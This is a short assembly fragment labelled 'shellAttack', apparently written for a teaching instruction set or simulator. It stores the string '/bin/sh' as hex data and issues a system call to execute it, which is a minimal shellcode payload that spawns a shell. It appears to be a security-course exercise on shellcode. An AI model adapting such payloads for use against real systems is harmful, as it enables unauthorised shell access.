shellAttack:
        gpc $10, r0 #It will store the address of /bin/sh as an string into this file which we acess without memory read just by PC
        ld $7, r1   #size of the buffer we want to read (7bytes) 2F 62 69 6E 2F 73 68
        sys $2  #sys call # 2 for executing the program buffer
        halt

AdressInHex:
        .long 0x2f62696e # /bin
        .long 0x2f736800 # /sh        